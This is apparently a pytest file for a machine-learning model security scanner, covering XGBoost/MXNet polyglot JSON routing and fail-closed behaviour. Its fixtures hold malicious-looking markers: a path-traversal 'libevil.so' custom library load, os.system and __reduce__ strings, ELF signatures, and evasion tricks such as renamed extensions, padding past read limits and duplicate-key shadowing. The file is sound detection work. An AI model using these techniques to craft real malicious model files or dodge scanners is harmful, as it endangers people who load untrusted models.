def test_scan_file_bom_prefixed_params_runs_xgboost_mxnet_overlap_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_text(
        '\ufeff{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)


def test_scan_file_xgboost_owned_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF"}'
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_file_xgboost_owned_shadowed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","nodes":[]}'
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_file_xgboost_owned_analysis_failed_params_preserves_raw_signature_findings(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)


def test_scan_file_xgboost_only_skips_overlap_params_signature_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF"}'
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is True
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_file_xgboost_only_skips_shadowed_params_signature_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","nodes":[]}'
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_file_xgboost_only_skips_analysis_failed_params_signature_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot-0000.params"
    model_path.write_bytes(
        b'{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        b'"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        b'"metadata":"\x7fELF","limit":' + (b"9" * 5000) + b"}"
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert "xgboost_json_analysis_failed" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]


def test_scan_file_runs_xgboost_checks_for_conclusive_mxnet_json_overlap(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_runs_xgboost_checks_for_probable_malformed_mxnet_json_overlap(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-polyglot.json"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


@pytest.mark.parametrize("filename", ["malformed-0000.params", "malformed.jpg"])
def test_scan_file_runs_xgboost_checks_for_renamed_probable_malformed_mxnet_overlap(
    tmp_path: Path,
    filename: str,
) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"__reduce__"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(
        "Suspicious pattern detected: Pickle-like reduction pattern in JSON" in issue.message for issue in result.issues
    )


def test_scan_file_syntactically_malformed_renamed_mxnet_xgboost_overlap_fails_closed(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed.jpg"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],@}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_json_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) != 0


@pytest.mark.parametrize("suffix", ["@}", ""])
def test_scan_file_partial_malformed_renamed_mxnet_xgboost_overlap_fails_closed(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = tmp_path / "malformed.jpg"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":' + suffix,
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_xgboost_only_runs_renamed_probable_malformed_mxnet_overlap(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-0000.params"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_xgboost_only_malformed_overlap_is_exit2_and_not_cached(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-0000.params"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == "inconclusive"
            assert "xgboost_json_structure_invalid" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert "mxnet" in metadata["skipped_scanner_ids"]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_runs_xgboost_checks_for_bounded_probable_malformed_mxnet_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "bounded-polyglot.json"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"padding":"' + ("x" * 256) + '","nodes":[{"op":"null","name":"data"}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_keeps_benign_mxnet_json_near_match_out_of_xgboost_routing(tmp_path: Path) -> None:
    model_path = tmp_path / "benign-symbol.json"
    model_path.write_text(
        '{"learner":{"description":"benign metadata"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


@pytest.mark.parametrize("filename", ["nested-metadata.json", "nested-metadata-symbol.json"])
def test_scan_file_keeps_nested_xgboost_marker_names_in_mxnet_metadata_out_of_xgboost_analysis(
    tmp_path: Path,
    filename: str,
) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"nodes":[{"op":"null","name":"data","attrs":{"documentation":'
        '{"version":"malformed","learner":{"gradient_booster":{},"note":"eval(x)"}}}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert not any(check.name == "JSON Content Analysis" for check in result.checks)


def test_scan_file_canonical_mxnet_symbol_composes_probable_xgboost_security_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "malformed-symbol.json"
    model_path.write_text(
        '{"version":"malformed","learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_fails_closed_for_xgboost_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "XGBoost / MXNet JSON Routing" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_xgboost_only_fails_closed_for_shadowed_mxnet_nodes(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]],"nodes":[]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "XGBoost / MXNet JSON Routing" and check.details.get("duplicate_root_keys") == ["nodes"]
        for check in result.checks
    )


def test_scan_file_mxnet_only_selection_preserves_overlap_security_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["mxnet"], "cache_enabled": False})

    assert result.scanner_name == "mxnet"
    assert any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    xgboost_selection_checks = [
        check
        for check in result.checks
        if check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "xgboost"
    ]
    assert len(xgboost_selection_checks) == 1
    assert xgboost_selection_checks[0].details.get("context") == "overlapping JSON analysis"
    assert xgboost_selection_checks[0].details.get("kind") == "preferred"


def test_scan_file_mxnet_only_selection_fails_closed_for_bounded_xgboost_overlap(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},"nodes":[{"op":"Custom","name":"load",'
        '"attrs":{"library":"../../tmp/libevil.so","padding":"' + ("x" * 256) + '"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["mxnet"], "cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "xgboost" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "xgboost"
        and check.details.get("context") == "overlapping JSON analysis"
        and check.details.get("kind") == "preferred"
        for check in result.checks
    )


def test_scan_file_xgboost_only_selection_skips_overlap_mxnet_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert result.scanner_name == "xgboost"
    assert result.success is True
    assert not any(issue.details.get("attribute") == "library" for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]
    assert "xgboost_mxnet_symbol_overlap" not in result.metadata.get("scan_outcome_reasons", [])
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "mxnet"
        and check.details.get("kind") == "embedded"
        for check in result.checks
    )


def test_scan_file_xgboost_only_overlap_is_clean_and_cached(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"'
        + ("x" * (10 * 1024))
        + '"}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is True
            assert "xgboost_mxnet_symbol_overlap" not in metadata.get("scan_outcome_reasons", [])
            assert core_module.determine_exit_code(aggregate) == 0
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize("version", ["[1,7,4]", '"malformed"'])
def test_scan_file_xgboost_only_oversized_renamed_overlap_is_not_clean_or_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    version: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    model_path = tmp_path / "polyglot.meta"
    model_path.write_text(
        '{"version":' + version + ',"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"
    direct = scan_file(str(model_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert direct.scanner_name == "xgboost"
    assert direct.success is False
    assert "max_file_read_size_exceeded" in direct.metadata["scan_outcome_reasons"]

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            scanners=["xgboost"],
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == "inconclusive"
            assert "max_file_read_size_exceeded" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 1
            assert "xgboost" in aggregate.scanner_names
            assert any(check.name == "File Size Limit" for check in aggregate.checks)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_inconclusive_params_routing_preserves_raw_findings(tmp_path: Path) -> None:
    params_path = tmp_path / "payload-0000.params"
    params_path.write_text(
        '{"metadata":"\u007fELF os.system()","padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(params_path), config={"scanners": ["mxnet"], "cache_enabled": False})
    aggregate = scan_model_directory_or_file(
        str(params_path),
        scanners=["mxnet"],
        cache_scan_results=False,
    )

    assert result.scanner_name == "unknown"
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert any("Suspicious executable token" in issue.message for issue in result.issues)
    assert any("Potential executable signature found in params blob" in issue.message for issue in aggregate.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_inconclusive_params_routing_honors_excluded_mxnet(tmp_path: Path) -> None:
    params_path = tmp_path / "payload-0000.params"
    params_path.write_text(
        '{"metadata":"\u007fELF os.system()","padding":['
        + ",".join("0" for _ in range(5000))
        + '],"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(params_path), config={"scanners": ["xgboost"], "cache_enabled": False})

    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not any("Potential executable signature found in params blob" in issue.message for issue in result.issues)
    assert not any("Suspicious executable token" in issue.message for issue in result.issues)
    assert "mxnet" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Scanner Selection"
        and check.details.get("skipped_scanner_id") == "mxnet"
        and check.details.get("context") == "inconclusive MXNet params byte analysis"
        and check.details.get("kind") == "embedded"
        for check in result.checks
    )


def test_scan_file_xgboost_mxnet_overlap_with_security_finding_is_exit1(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious-polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    metadata = aggregate.file_metadata[str(model_path)]

    assert core_module.determine_exit_code(aggregate) == 1
    assert "xgboost_mxnet_symbol_overlap" in metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in aggregate.issues)


def test_scan_file_xgboost_mxnet_overlap_is_exit2_and_not_cached(tmp_path: Path) -> None:
    model_path = tmp_path / "polyglot.json"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is False
            assert metadata["scan_outcome"] == "inconclusive"
            assert "xgboost_mxnet_symbol_overlap" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert any(
                check.name == "XGBoost / MXNet JSON Routing" and "both static analyses ran" in check.message
                for check in aggregate.checks
            )
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_keeps_oversized_renamed_overlap_on_bounded_mxnet_route(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 512)
    model_path = tmp_path / "polyglot.meta"
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{}},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],"padding":"' + ("x" * 600) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert not any(check.name == "JSON Parsing" for check in result.checks)


def test_scan_file_symbol_routed_params_preserves_raw_text_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(core_module, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 512)
    monkeypatch.setattr(mxnet_scanner, "MAX_SYMBOL_READ_BYTES", 512)
    model_path = tmp_path / "payload-0000.params"
    model_path.write_text(
        '{"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]],'
        '"version":[1,7,4],"learner":{"malicious_code":"os.system()"},"padding":"' + ("x" * 1024) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))
    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert result.scanner_name == "mxnet"
    assert any("Suspicious executable token" in issue.message for issue in result.issues)
    assert "mxnet_symbol_truncated" in result.metadata["scan_outcome_reasons"]
    assert core_module.determine_exit_code(aggregate) == 1
    assert any("Suspicious executable token" in issue.message for issue in aggregate.issues)


@pytest.mark.parametrize("filename", ["polyglot.jpg", "polyglot.params", "polyglot.meta"])
def test_scan_file_runs_xgboost_checks_for_renamed_mxnet_json_overlap(tmp_path: Path, filename: str) -> None:
    model_path = tmp_path / filename
    model_path.write_text(
        '{"version":[1,7,4],"learner":{"gradient_booster":{},"malicious_code":"os.system()"},'
        '"nodes":[{"op":"null","name":"data"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert "xgboost_mxnet_symbol_overlap" in result.metadata["scan_outcome_reasons"]
    assert any("Suspicious pattern detected: System call in JSON" in issue.message for issue in result.issues)


def test_scan_file_fails_closed_for_mxnet_integer_decode_limit(tmp_path: Path) -> None:
    model_path = tmp_path / "broken-symbol.json"
    model_path.write_text(
        '{"n":' + ("9" * 5000) + ',"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(model_path))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]


@pytest.mark.parametrize("filename", ["recursive.params", "recursive.meta"])
def test_scan_file_fails_closed_for_routed_mxnet_decoder_recursion(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
) -> None:
    model_path = create_mock_mxnet_symbol(tmp_path / filename)

    def raise_recursion(_payload: object) -> object:
        raise RecursionError("decoder nesting limit")

    monkeypatch.setattr(mxnet_scanner.json, "loads", raise_recursion)

    result = scan_file(str(model_path))

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert "mxnet_symbol_parse_failed" in result.metadata["scan_outcome_reasons"]


def test_scan_file_large_generic_json_without_mxnet_hint_fails_closed(tmp_path: Path) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"metadata":"' + ("x" * (file_detection.MXNET_SYMBOL_SIGNATURE_READ_BYTES + 1)) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_whitespace_prefixed_generic_json_without_mxnet_hint_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text((" " * 129) + '{"metadata":"safe"}', encoding="utf-8")

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_scalar_heads_generic_json_uses_existing_owner(tmp_path: Path) -> None:
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":"main","padding":[' + ",".join("0" for _ in range(5000)) + "]}",
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.scanner_name == "manifest"
    assert "mxnet_symbol_routing_incomplete" not in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_fails_closed_for_large_generic_json_with_truncated_duplicate_mxnet_nodes(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":[[0,0,0]],"nodes":[],"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


@pytest.mark.parametrize("initial_nodes", ["[]", "null"])
def test_scan_file_fails_closed_for_early_duplicate_mxnet_nodes_without_other_hints(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    initial_nodes: str,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "metadata.json"
    config_path.write_text(
        '{"nodes":'
        + initial_nodes
        + ',"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

